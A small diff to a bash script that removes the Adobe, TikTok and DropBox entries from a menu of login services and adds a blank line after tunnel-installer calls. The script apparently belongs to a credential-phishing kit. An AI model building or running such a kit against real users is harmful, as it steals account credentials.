@@ -462,7 +462,6 @@ main_menu() {
 		${RED}[${WHITE}01${RED}]${YELLOW} Facebook      ${RED}[${WHITE}02${RED}]${YELLOW} Instagram      ${RED}[${WHITE}03${RED}]${YELLOW} Google   
 ${RED}[${WHITE}04${RED}]${YELLOW} Twitter       ${RED}[${WHITE}05${RED}]${YELLOW} Snapchat       ${RED}[${WHITE}06${RED}]${YELLOW} Linkedin
 		${RED}[${WHITE}07${RED}]${YELLOW} Microsoft     ${RED}[${WHITE}08${RED}]${YELLOW} Spotify        ${RED}[${WHITE}09${RED}]${YELLOW} Netflix 
-		${RED}[${WHITE}10${RED}]${YELLOW} Adobe         ${RED}[${WHITE}11${RED}]${YELLOW} Tiktok         ${RED}[${WHITE}12${RED}]${YELLOW} DropBox
 		${RED}[${WHITE}99${RED}]${YELLOW} About
 		${RED}[${WHITE}00${RED}]${YELLOW} Exit
 	EOF
@@ -516,4 +515,5 @@ kill_pid
 dependencies
 install_cloudflared
 install_localxpose
+
 main_menu
